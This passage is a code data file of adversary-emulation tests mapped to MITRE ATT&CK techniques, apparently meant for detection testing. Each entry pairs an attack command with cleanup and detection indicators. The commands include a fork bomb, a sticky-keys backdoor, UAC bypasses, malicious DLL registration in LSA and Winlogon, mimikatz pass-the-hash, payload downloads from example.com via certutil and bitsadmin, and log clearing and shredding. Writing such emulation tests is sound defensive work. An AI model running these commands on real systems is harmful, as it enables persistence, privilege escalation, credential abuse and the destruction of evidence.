    cleanup: 'Get-ChildItem -Path %USERPROFILE%\\Documents -Include *.encrypted -Recurse | Rename-Item -NewName { $_.Name -replace \\.encrypted$ }',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'critical',
    detectionIndicators: ['.encrypted', '.locked', '.crypto', 'Rename-Item']
  },
  {
    id: 'T1499.001-1',
    technique: 'T1499.001',
    techniqueName: 'Endpoint Denial of Service: OS Exhaustion Flood',
    tactic: 'Impact',
    name: 'Fork Bomb',
    description: 'Executes fork bomb to exhaust system resources',
    platforms: ['linux'],
    executor: ':(){ :|: & };:',
    executorType: 'bash',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'critical',
    detectionIndicators: ['fork', 'resource exhaustion', 'maxproc']
  },
  {
    id: 'T1491.001-1',
    technique: 'T1491.001',
    techniqueName: 'Defacement: Internal Defacement',
    tactic: 'Impact',
    name: 'Change Desktop Wallpaper',
    description: 'Changes desktop wallpaper to simulate ransomware',
    platforms: ['windows'],
    executor: 'reg add "HKCU\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d "C:\\Atomic\\wallpaper.bmp" /f; RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters',
    executorType: 'command_prompt',
    cleanup: 'reg add "HKCU\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d "" /f',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'low',
    detectionIndicators: ['Wallpaper', 'UpdatePerUserSystemParameters', 'user32.dll']
  },

  // Additional Techniques (Expanding to 100+)
  {
    id: 'T1087.001-1',
    technique: 'T1087.001',
    techniqueName: 'Account Discovery: Local Account',
    tactic: 'Discovery',
    name: 'Enumerate Local Users',
    description: 'Enumerates local user accounts',
    platforms: ['windows'],
    executor: 'net user',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'low',
    detectionIndicators: ['net user', 'net localgroup', 'Get-LocalUser']
  },
  {
    id: 'T1087.002-1',
    technique: 'T1087.002',
    techniqueName: 'Account Discovery: Domain Account',
    tactic: 'Discovery',
    name: 'Enumerate Domain Users',
    description: 'Enumerates domain user accounts',
    platforms: ['windows'],
    executor: 'net user /domain',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'medium',
    detectionIndicators: ['net user /domain', 'net group /domain', 'dsquery']
  },
  {
    id: 'T1033-1',
    technique: 'T1033',
    techniqueName: 'System Owner/User Discovery',
    tactic: 'Discovery',
    name: 'Identify Current User',
    description: 'Identifies currently logged in user',
    platforms: ['windows'],
    executor: 'whoami && whoami /priv && whoami /groups',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'low',
    detectionIndicators: ['whoami', '/priv', '/groups']
  },
  {
    id: 'T1059.003-2',
    technique: 'T1059.003',
    techniqueName: 'Windows Command Shell',
    tactic: 'Execution',
    name: 'Command Obfuscation',
    description: 'Executes obfuscated command using environment variables',
    platforms: ['windows'],
    executor: 'cmd /c "set x=calc && %x%.exe"',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'medium',
    detectionIndicators: ['set x=', '%x%', 'environment variable', 'obfuscation']
  },
  {
    id: 'T1546.007-1',
    technique: 'T1546.007',
    techniqueName: 'Event Triggered Execution: Netsh Helper DLL',
    tactic: 'Persistence',
    name: 'Netsh Helper DLL',
    description: 'Registers malicious DLL as netsh helper',
    platforms: ['windows'],
    executor: 'netsh add helper %TEMP%\\malicious.dll',
    executorType: 'command_prompt',
    cleanup: 'netsh delete helper %TEMP%\\malicious.dll',
    elevationRequired: true,
    difficulty: 'medium',
    impact: 'high',
    detectionIndicators: ['netsh add helper', 'netsh delete helper']
  },
  {
    id: 'T1546.008-1',
    technique: 'T1546.008',
    techniqueName: 'Event Triggered Execution: Accessibility Features',
    tactic: 'Persistence',
    name: 'Sticky Keys Backdoor',
    description: 'Replaces sticky keys with cmd.exe',
    platforms: ['windows'],
    executor: 'copy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe',
    executorType: 'command_prompt',
    cleanup: 'sfc /scannow',
    elevationRequired: true,
    difficulty: 'easy',
    impact: 'critical',
    detectionIndicators: ['sethc.exe', 'utilman.exe', 'osk.exe', 'cmd.exe']
  },
  {
    id: 'T1546.010-1',
    technique: 'T1546.010',
    techniqueName: 'AppInit DLLs',
    tactic: 'Persistence',
    name: 'AppInit_DLLs Modification',
    description: 'Modifies AppInit_DLLs registry key',
    platforms: ['windows'],
    executor: 'reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v AppInit_DLLs /t REG_SZ /d "malicious.dll" /f',
    executorType: 'command_prompt',
    cleanup: 'reg delete "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v AppInit_DLLs /f',
    elevationRequired: true,
    difficulty: 'medium',
    impact: 'high',
    detectionIndicators: ['AppInit_DLLs', 'LoadAppInit_DLLs']
  },
  {
    id: 'T1546.011-1',
    technique: 'T1546.011',
    techniqueName: 'Application Shimming',
    tactic: 'Persistence',
    name: 'Install Application Shim',
    description: 'Installs application compatibility shim',
    platforms: ['windows'],
    executor: 'sdbinst.exe %TEMP%\\AtomicShim.sdb',
    executorType: 'command_prompt',
    cleanup: 'sdbinst.exe -u %TEMP%\\AtomicShim.sdb',
    elevationRequired: true,
    difficulty: 'hard',
    impact: 'high',
    detectionIndicators: ['sdbinst.exe', '.sdb', 'shim']
  },
  {
    id: 'T1547.002-1',
    technique: 'T1547.002',
    techniqueName: 'Authentication Package',
    tactic: 'Persistence',
    name: 'Modify Authentication Packages',
    description: 'Modifies LSA authentication packages',
    platforms: ['windows'],
    executor: 'reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0\\0malicious.dll" /f',
    executorType: 'command_prompt',
    cleanup: 'reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0" /f',
    elevationRequired: true,
    difficulty: 'hard',
    impact: 'critical',
    detectionIndicators: ['Authentication Packages', 'msv1_0', 'Lsa']
  },
  {
    id: 'T1547.003-1',
    technique: 'T1547.003',
    techniqueName: 'Time Providers',
    tactic: 'Persistence',
    name: 'Install Malicious Time Provider',
    description: 'Installs malicious time provider DLL',
    platforms: ['windows'],
    executor: 'reg add "HKLM\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpClient" /v DllName /t REG_SZ /d "%TEMP%\\malicious.dll" /f',
    executorType: 'command_prompt',
    cleanup: 'reg add "HKLM\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpClient" /v DllName /t REG_SZ /d "w32time.dll" /f',
    elevationRequired: true,
    difficulty: 'hard',
    impact: 'medium',
    detectionIndicators: ['TimeProviders', 'w32time', 'DllName']
  },
  {
    id: 'T1547.004-1',
    technique: 'T1547.004',
    techniqueName: 'Winlogon Helper DLL',
    tactic: 'Persistence',
    name: 'Winlogon Shell Modification',
    description: 'Modifies Winlogon shell value',
    platforms: ['windows'],
    executor: 'reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, %TEMP%\malicious.exe" /f',
    executorType: 'command_prompt',
    cleanup: 'reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe" /f',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'high',
    detectionIndicators: ['Winlogon', 'Shell', 'explorer.exe']
  },
  {
    id: 'T1547.005-1',
    technique: 'T1547.005',
    techniqueName: 'Security Support Provider',
    tactic: 'Persistence',
    name: 'Install SSP DLL',
    description: 'Installs Security Support Provider DLL',
    platforms: ['windows'],
    executor: 'reg add "HKLM\System\CurrentControlSet\Control\Lsa\OSConfig" /v Security Packages /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0malicious" /f',
    executorType: 'command_prompt',
    cleanup: 'reg delete "HKLM\System\CurrentControlSet\Control\Lsa\OSConfig" /v "Security Packages" /f',
    elevationRequired: true,
    difficulty: 'hard',
    impact: 'critical',
    detectionIndicators: ['Security Packages', 'LSA', 'SSP']
  },
  {
    id: 'T1547.007-1',
    technique: 'T1547.007',
    techniqueName: 'Re-opened Applications',
    tactic: 'Persistence',
    name: 'Modify RDP Startup Programs',
    description: 'Modifies RDP startup programs',
    platforms: ['windows'],
    executor: 'reg add "HKCU\Software\Microsoft\Terminal Server Client\Default\AddIns\SampleAddIn" /v Name /t REG_SZ /d "malicious.dll" /f',
    executorType: 'command_prompt',
    cleanup: 'reg delete "HKCU\Software\Microsoft\Terminal Server Client\Default\AddIns\SampleAddIn" /f',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'medium',
    detectionIndicators: ['Terminal Server Client', 'AddIns', 'RDP']
  },
  {
    id: 'T1547.009-2',
    technique: 'T1547.009',
    techniqueName: 'Shortcut Modification',
    tactic: 'Persistence',
    name: 'Startup Folder Shortcut',
    description: 'Creates shortcut in startup folder',
    platforms: ['windows'],
    executor: 'Copy-Item -Path "C:\Windows\System32\calc.exe" -Destination "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\malicious.lnk"',
    executorType: 'powershell',
    cleanup: 'Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\malicious.lnk"',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'high',
    detectionIndicators: ['Startup', 'Programs\Startup', '.lnk']
  },
  {
    id: 'T1547.010-1',
    technique: 'T1547.010',
    techniqueName: 'Port Monitors',
    tactic: 'Persistence',
    name: 'Add Port Monitor',
    description: 'Adds malicious port monitor',
    platforms: ['windows'],
    executor: 'reg add "HKLM\System\CurrentControlSet\Control\Print\Monitors\AtomicMonitor" /v Driver /t REG_SZ /d "malicious.dll" /f',
    executorType: 'command_prompt',
    cleanup: 'reg delete "HKLM\System\CurrentControlSet\Control\Print\Monitors\AtomicMonitor" /f',
    elevationRequired: true,
    difficulty: 'hard',
    impact: 'high',
    detectionIndicators: ['Print\Monitors', 'Driver', 'monitors']
  },
  {
    id: 'T1547.012-1',
    technique: 'T1547.012',
    techniqueName: 'Print Processors',
    tactic: 'Persistence',
    name: 'Add Print Processor',
    description: 'Adds malicious print processor',
    platforms: ['windows'],
    executor: 'reg add "HKLM\System\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicProcessor" /v Driver /t REG_SZ /d "malicious.dll" /f',
    executorType: 'command_prompt',
    cleanup: 'reg delete "HKLM\System\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicProcessor" /f',
    elevationRequired: true,
    difficulty: 'hard',
    impact: 'high',
    detectionIndicators: ['Print Processors', 'Environments', 'Windows x64']
  },
  {
    id: 'T1547.014-1',
    technique: 'T1547.014',
    techniqueName: 'Active Setup',
    tactic: 'Persistence',
    name: 'Active Setup Stub Path',
    description: 'Modifies Active Setup stub path',
    platforms: ['windows'],
    executor: 'reg add "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\AtomicTest" /v StubPath /t REG_SZ /d "C:\Windows\System32\calc.exe" /f',
    executorType: 'command_prompt',
    cleanup: 'reg delete "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\AtomicTest" /f',
    elevationRequired: true,
    difficulty: 'medium',
    impact: 'high',
    detectionIndicators: ['Active Setup', 'Installed Components', 'StubPath']
  },
  {
    id: 'T1547.015-1',
    technique: 'T1547.015',
    techniqueName: 'Component Object Model Hijacking',
    tactic: 'Persistence',
    name: 'COM Hijacking',
    description: 'Hijacks COM object for persistence',
    platforms: ['windows'],
    executor: 'reg add "HKCU\Software\Classes\CLSID\{12345678-1234-1234-1234-123456789012}\InprocServer32" /ve /t REG_SZ /d "C:\temp\malicious.dll" /f',
    executorType: 'command_prompt',
    cleanup: 'reg delete "HKCU\Software\Classes\CLSID\{12345678-1234-1234-1234-123456789012}" /f',
    elevationRequired: false,
    difficulty: 'hard',
    impact: 'high',
    detectionIndicators: ['CLSID', 'InprocServer32', 'TreatAs']
  },
  {
    id: 'T1548.002-1',
    technique: 'T1548.002',
    techniqueName: 'Bypass User Account Control',
    tactic: 'Privilege Escalation',
    name: 'UAC Bypass via Event Viewer',
    description: 'Bypasses UAC using Event Viewer',
    platforms: ['windows'],
    executor: 'reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f && eventvwr.exe',
    executorType: 'command_prompt',
    cleanup: 'reg delete "HKCU\Software\Classes\mscfile" /f',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'high',
    detectionIndicators: ['eventvwr.exe', 'mscfile', 'shell\open\command']
  },
  {
    id: 'T1548.002-2',
    technique: 'T1548.002',
    techniqueName: 'Bypass User Account Control',
    tactic: 'Privilege Escalation',
    name: 'UAC Bypass via ComputerDefaults',
    description: 'Bypasses UAC using ComputerDefaults',
    platforms: ['windows'],
    executor: 'reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f && reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /f && computerdefaults.exe',
    executorType: 'command_prompt',
    cleanup: 'reg delete "HKCU\Software\Classes\ms-settings" /f',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'high',
    detectionIndicators: ['computerdefaults.exe', 'ms-settings', 'DelegateExecute']
  },
  {
    id: 'T1053.005-1',
    technique: 'T1053.005',
    techniqueName: 'Scheduled Task',
    tactic: 'Execution',
    name: 'Create Scheduled Task',
    description: 'Creates scheduled task for persistence',
    platforms: ['windows'],
    executor: 'schtasks /create /tn "AtomicTask" /tr "C:\Windows\System32\calc.exe" /sc daily /st 12:00',
    executorType: 'command_prompt',
    cleanup: 'schtasks /delete /tn "AtomicTask" /f',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'medium',
    detectionIndicators: ['schtasks', '/create', 'Scheduled Task']
  },
  {
    id: 'T1047-1',
    technique: 'T1047',
    techniqueName: 'Windows Management Instrumentation',
    tactic: 'Execution',
    name: 'WMI Process Creation',
    description: 'Creates process using WMI',
    platforms: ['windows'],
    executor: 'wmic process call create "calc.exe"',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'medium',
    detectionIndicators: ['wmic', 'process call create']
  },
  {
    id: 'T1047-2',
    technique: 'T1047',
    techniqueName: 'Windows Management Instrumentation',
    tactic: 'Execution',
    name: 'WMI Remote Process Creation',
    description: 'Creates process on remote system using WMI',
    platforms: ['windows'],
    executor: 'wmic /node:target /user:administrator /password:password process call create "cmd.exe /c calc.exe"',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'high',
    detectionIndicators: ['wmic /node', '/user:', '/password:', 'process call create']
  },
  {
    id: 'T1569.002-1',
    technique: 'T1569.002',
    techniqueName: 'System Services: Service Execution',
    tactic: 'Execution',
    name: 'Execute via Service',
    description: 'Executes command via service creation',
    platforms: ['windows'],
    executor: 'sc create AtomicService binPath= "cmd.exe /c calc.exe" start= demand && sc start AtomicService && sc delete AtomicService',
    executorType: 'command_prompt',
    elevationRequired: true,
    difficulty: 'medium',
    impact: 'medium',
    detectionIndicators: ['sc create', 'sc start', 'binPath= cmd']
  },
  {
    id: 'T1129-1',
    technique: 'T1129',
    techniqueName: 'Shared Modules',
    tactic: 'Execution',
    name: 'Execute DLL via Rundll32',
    description: 'Executes DLL using rundll32',
    platforms: ['windows'],
    executor: 'rundll32.exe shell32.dll,Control_RunDLL payload.dll',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'medium',
    detectionIndicators: ['rundll32', 'Control_RunDLL', '.dll']
  },
  {
    id: 'T1078.001-1',
    technique: 'T1078.001',
    techniqueName: 'Valid Accounts: Default Accounts',
    tactic: 'Initial Access',
    name: 'Authenticate as Guest',
    description: 'Attempts to authenticate as guest user',
    platforms: ['windows'],
    executor: 'net use \\target\ipc$ /user:guest ""',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'medium',
    detectionIndicators: ['net use', 'guest', 'ipc$']
  },
  {
    id: 'T1550.002-1',
    technique: 'T1550.002',
    techniqueName: 'Use Alternate Authentication Material: Pass the Hash',
    tactic: 'Lateral Movement',
    name: 'Pass the Hash',
    description: 'Uses pass-the-hash for authentication',
    platforms: ['windows'],
    executor: 'mimikatz.exe "sekurlsa::pth /user:administrator /domain:atomic.local /ntlm:12345678901234567890123456789012" exit',
    executorType: 'command_prompt',
    elevationRequired: true,
    dependencies: ['mimikatz.exe'],
    difficulty: 'hard',
    impact: 'critical',
    detectionIndicators: ['sekurlsa::pth', 'Pass-the-Hash', 'mimikatz']
  },
  {
    id: 'T1021.001-1',
    technique: 'T1021.001',
    techniqueName: 'Remote Desktop Protocol',
    tactic: 'Lateral Movement',
    name: 'RDP Connection',
    description: 'Connects to remote system via RDP',
    platforms: ['windows'],
    executor: 'mstsc.exe /v:target /admin',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'medium',
    detectionIndicators: ['mstsc.exe', 'Remote Desktop', '3389']
  },
  {
    id: 'T1021.004-1',
    technique: 'T1021.004',
    techniqueName: 'SSH',
    tactic: 'Lateral Movement',
    name: 'SSH Connection',
    description: 'Connects to remote system via SSH',
    platforms: ['linux'],
    executor: 'ssh user@target',
    executorType: 'bash',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'medium',
    detectionIndicators: ['ssh', '22/tcp', 'OpenSSH']
  },
  {
    id: 'T1090.001-1',
    technique: 'T1090.001',
    techniqueName: 'Internal Proxy',
    tactic: 'Command and Control',
    name: 'Port Forwarding with Netsh',
    description: 'Configures port forwarding using netsh',
    platforms: ['windows'],
    executor: 'netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.1',
    executorType: 'command_prompt',
    cleanup: 'netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0',
    elevationRequired: true,
    difficulty: 'medium',
    impact: 'medium',
    detectionIndicators: ['netsh', 'portproxy', 'v4tov4']
  },
  {
    id: 'T1090.003-1',
    technique: 'T1090.003',
    techniqueName: 'Multi-hop Proxy',
    tactic: 'Command and Control',
    name: 'Dynamic Port Forwarding',
    description: 'Sets up dynamic port forwarding via SSH',
    platforms: ['linux'],
    executor: 'ssh -D 9050 user@proxy-server',
    executorType: 'bash',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'medium',
    detectionIndicators: ['ssh -D', 'SOCKS', 'dynamic forwarding']
  },
  {
    id: 'T1571-1',
    technique: 'T1571',
    techniqueName: 'Non-Standard Port',
    tactic: 'Command and Control',
    name: 'C2 over Non-Standard Port',
    description: 'Communicates over non-standard port',
    platforms: ['windows'],
    executor: 'powershell -Command "$client = New-Object System.Net.Sockets.TCPClient(\'example.com\',8443);$stream = $client.GetStream()"',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'medium',
    detectionIndicators: ['TCPClient', '8443', '8080', 'Non-standard port']
  },
  {
    id: 'T1572-1',
    technique: 'T1572',
    techniqueName: 'Protocol Tunneling',
    tactic: 'Command and Control',
    name: 'DNS Tunneling',
    description: 'Tunnels data over DNS protocol',
    platforms: ['windows'],
    executor: 'nslookup -type=txt atomic-test.com',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'hard',
    impact: 'medium',
    detectionIndicators: ['nslookup', 'type=txt', 'DNS tunnel', 'large DNS queries']
  },
  {
    id: 'T1573.002-1',
    technique: 'T1573.002',
    techniqueName: 'Encrypted Channel: Asymmetric Cryptography',
    tactic: 'Command and Control',
    name: 'HTTPS C2 Communication',
    description: 'Uses HTTPS for encrypted C2',
    platforms: ['windows'],
    executor: 'Invoke-WebRequest -Uri https://example.com/c2 -Method POST',
    executorType: 'powershell',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'medium',
    detectionIndicators: ['https://', 'TLS', 'SSL', 'Invoke-WebRequest']
  },
  {
    id: 'T1001.001-1',
    technique: 'T1001.001',
    techniqueName: 'Data Obfuscation: Junk Data',
    tactic: 'Command and Control',
    name: 'Junk Data in C2',
    description: 'Adds junk data to C2 traffic',
    platforms: ['windows'],
    executor: 'powershell -Command "$data = (Get-Random -Count 100); Invoke-WebRequest -Uri http://example.com -Body $data -Method POST"',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'low',
    detectionIndicators: ['Get-Random', 'junk data', 'padding']
  },
  {
    id: 'T1001.003-1',
    technique: 'T1001.003',
    techniqueName: 'Data Obfuscation: Protocol Impersonation',
    tactic: 'Command and Control',
    name: 'C2 over DNS',
    description: 'Disguises C2 traffic as DNS',
    platforms: ['windows'],
    executor: 'Resolve-DnsName -Name "atomic-test.com" -Type TXT',
    executorType: 'powershell',
    elevationRequired: false,
    difficulty: 'hard',
    impact: 'medium',
    detectionIndicators: ['Resolve-DnsName', 'TXT record', 'DNS C2']
  },
  {
    id: 'T1568.002-1',
    technique: 'T1568.002',
    techniqueName: 'Dynamic Resolution: Domain Generation Algorithms',
    tactic: 'Command and Control',
    name: 'DGA Domain Resolution',
    description: 'Resolves DGA domains',
    platforms: ['windows'],
    executor: 'for ($i=0; $i -lt 10; $i++) { $domain = "atomic$i.com"; Resolve-DnsName $domain -ErrorAction SilentlyContinue }',
    executorType: 'powershell',
    elevationRequired: false,
    difficulty: 'hard',
    impact: 'medium',
    detectionIndicators: ['DGA', 'algorithmic domains', 'high entropy domains']
  },
  {
    id: 'T1570-1',
    technique: 'T1570',
    techniqueName: 'Lateral Tool Transfer',
    tactic: 'Lateral Movement',
    name: 'Copy Tool to Remote Share',
    description: 'Copies tools to remote admin share',
    platforms: ['windows'],
    executor: 'copy C:\\tools\\mimikatz.exe \\target\\admin$\\system32\\',
    executorType: 'command_prompt',
    cleanup: 'del \\target\\admin$\system32\\mimikatz.exe',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'high',
    detectionIndicators: ['copy', 'admin$', 'C$', 'mimikatz']
  },
  {
    id: 'T1570-2',
    technique: 'T1570',
    techniqueName: 'Lateral Tool Transfer',
    tactic: 'Lateral Movement',
    name: 'Download Tool via BITS',
    description: 'Uses BITS to download tool to remote system',
    platforms: ['windows'],
    executor: 'bitsadmin /transfer AtomicJob /download /priority normal http://example.com/tool.exe %TEMP%\tool.exe',
    executorType: 'command_prompt',
    cleanup: 'del %TEMP%\tool.exe',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'medium',
    detectionIndicators: ['bitsadmin', '/transfer', '/download']
  },
  {
    id: 'T1105-1',
    technique: 'T1105',
    techniqueName: 'Ingress Tool Transfer',
    tactic: 'Command and Control',
    name: 'Download via PowerShell',
    description: 'Downloads tool using PowerShell',
    platforms: ['windows'],
    executor: 'Invoke-WebRequest -Uri http://example.com/tool.exe -OutFile %TEMP%\tool.exe',
    executorType: 'powershell',
    cleanup: 'Remove-Item %TEMP%\tool.exe',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'medium',
    detectionIndicators: ['Invoke-WebRequest', 'DownloadFile', 'Start-BitsTransfer']
  },
  {
    id: 'T1105-2',
    technique: 'T1105',
    techniqueName: 'Ingress Tool Transfer',
    tactic: 'Command and Control',
    name: 'Download via Certutil',
    description: 'Downloads file using certutil',
    platforms: ['windows'],
    executor: 'certutil -urlcache -split -f http://example.com/payload.exe %TEMP%\payload.exe',
    executorType: 'command_prompt',
    cleanup: 'del %TEMP%\payload.exe',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'medium',
    detectionIndicators: ['certutil', '-urlcache', '-split', '-f']
  },
  {
    id: 'T1105-3',
    technique: 'T1105',
    techniqueName: 'Ingress Tool Transfer',
    tactic: 'Command and Control',
    name: 'Download via BITSAdmin',
    description: 'Downloads file using BITSAdmin',
    platforms: ['windows'],
    executor: 'bitsadmin.exe /transfer /download /priority foreground http://example.com/file.exe %TEMP%\file.exe',
    executorType: 'command_prompt',
    cleanup: 'del %TEMP%\file.exe',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'medium',
    detectionIndicators: ['bitsadmin.exe', '/transfer', '/download']
  },
  {
    id: 'T1036.003-1',
    technique: 'T1036.003',
    techniqueName: 'Masquerading: Rename System Utilities',
    tactic: 'Defense Evasion',
    name: 'Copy and Rename System Tool',
    description: 'Copies and renames system utility to evade detection',
    platforms: ['windows'],
    executor: 'copy C:\Windows\System32\cmd.exe %TEMP%\notepad.exe && %TEMP%\notepad.exe /c whoami',
    executorType: 'command_prompt',
    cleanup: 'del %TEMP%\notepad.exe',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'medium',
    detectionIndicators: ['copy cmd.exe', 'rename', 'masquerading']
  },
  {
    id: 'T1036.004-1',
    technique: 'T1036.004',
    techniqueName: 'Masquerading: Masquerade Task or Service',
    tactic: 'Defense Evasion',
    name: 'Masqueraded Service Creation',
    description: 'Creates service with legitimate-looking name',
    platforms: ['windows'],
    executor: 'sc create "WindowsUpdateService" binPath= "C:\Windows\Temp\malicious.exe" start= auto',
    executorType: 'command_prompt',
    cleanup: 'sc delete "WindowsUpdateService"',
    elevationRequired: true,
    difficulty: 'medium',
    impact: 'high',
    detectionIndicators: ['WindowsUpdateService', 'masqueraded service', 'sc create']
  },
  {
    id: 'T1036.005-1',
    technique: 'T1036.005',
    techniqueName: 'Match Legitimate Name or Location',
    tactic: 'Defense Evasion',
    name: 'Malware in System32',
    description: 'Places malware in System32 directory',
    platforms: ['windows'],
    executor: 'copy %TEMP%\malicious.exe C:\Windows\System32\svchost.exe',
    executorType: 'command_prompt',
    cleanup: 'del C:\Windows\System32\svchost.exe',
    elevationRequired: true,
    difficulty: 'medium',
    impact: 'critical',
    detectionIndicators: ['System32\svchost.exe', 'System32\lsass.exe', 'masquerading']
  },
  {
    id: 'T1036.006-1',
    technique: 'T1036.006',
    techniqueName: 'Masquerading: Space After Filename',
    tactic: 'Defense Evasion',
    name: 'Space After Filename',
    description: 'Executes file with space after filename to masquerade',
    platforms: ['windows'],
    executor: 'copy C:\Windows\System32\cmd.exe "C:\Windows\Temp\notepad .exe" && "C:\Windows\Temp\notepad .exe" /c whoami',
    executorType: 'command_prompt',
    cleanup: 'del "C:\Windows\Temp\notepad .exe"',
    elevationRequired: false,
    difficulty: 'medium',
    impact: 'medium',
    detectionIndicators: ['notepad .exe', 'space after filename', 'trailing space']
  },
  {
    id: 'T1027.001-1',
    technique: 'T1027.001',
    techniqueName: 'Obfuscated Files or Information: Binary Padding',
    tactic: 'Defense Evasion',
    name: 'Binary Padding',
    description: 'Pads binary to change hash',
    platforms: ['windows'],
    executor: 'echo. >> %TEMP%\payload.exe',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'low',
    detectionIndicators: ['binary padding', 'hash change', 'file modification']
  },
  {
    id: 'T1070.001-1',
    technique: 'T1070.001',
    techniqueName: 'Indicator Removal: Clear Windows Event Logs',
    tactic: 'Defense Evasion',
    name: 'Clear Event Logs',
    description: 'Clears Windows event logs',
    platforms: ['windows'],
    executor: 'wevtutil cl System && wevtutil cl Security && wevtutil cl Application',
    executorType: 'command_prompt',
    elevationRequired: true,
    difficulty: 'easy',
    impact: 'high',
    detectionIndicators: ['wevtutil', 'cl', 'Clear-EventLog']
  },
  {
    id: 'T1070.002-1',
    technique: 'T1070.002',
    techniqueName: 'Indicator Removal: Clear Linux or Mac System Logs',
    tactic: 'Defense Evasion',
    name: 'Clear Linux Logs',
    description: 'Clears Linux system logs',
    platforms: ['linux'],
    executor: 'shred -u /var/log/auth.log /var/log/syslog',
    executorType: 'bash',
    elevationRequired: true,
    difficulty: 'easy',
    impact: 'high',
    detectionIndicators: ['shred', 'rm', '/var/log']
  },
  {
    id: 'T1070.003-1',
    technique: 'T1070.003',
    techniqueName: 'Indicator Removal: Clear Command History',
    tactic: 'Defense Evasion',
    name: 'Clear PowerShell History',
    description: 'Clears PowerShell command history',
    platforms: ['windows'],
    executor: 'Clear-History; Remove-Item (Get-PSReadlineOption).HistorySavePath -Force',
    executorType: 'powershell',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'low',
    detectionIndicators: ['Clear-History', 'HistorySavePath']
  },
  {
    id: 'T1070.004-2',
    technique: 'T1070.004',
    techniqueName: 'Indicator Removal: File Deletion',
    tactic: 'Defense Evasion',
    name: 'Secure File Deletion',
    description: 'Securely deletes file using cipher',
    platforms: ['windows'],
    executor: 'cipher /w:%TEMP%',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'low',
    detectionIndicators: ['cipher', '/w:', 'secure deletion']
  },
  {
    id: 'T1070.005-1',
    technique: 'T1070.005',
    techniqueName: 'Indicator Removal: Network Share Connection Removal',
    tactic: 'Defense Evasion',
    name: 'Clear Network Connections',
    description: 'Clears network connection history',
    platforms: ['windows'],
    executor: 'net use * /delete /y',
    executorType: 'command_prompt',
    elevationRequired: false,
    difficulty: 'easy',
    impact: 'low',
    detectionIndicators: ['net use', '/delete', 'connection removal']
  },
  {
    id: 'T1070.006-1',
    technique: 'T1070.006',
    techniqueName: 'Indicator Removal: Timestomp',
    tactic: 'Defense Evasion',
    name: 'Timestomp File',
    description: 'Modifies file timestamps',
    platforms: ['windows'],
    executor: 'powershell -Command "(Get-Item %TEMP%\file.txt).CreationTime = \"01/01/2020 00:00:00\"; (Get-Item %TEMP%\file.txt).LastAccessTime = \"01/01/2020 00:00:00\""',
    executorType: 'command_prompt',
    elevationRequired: false,
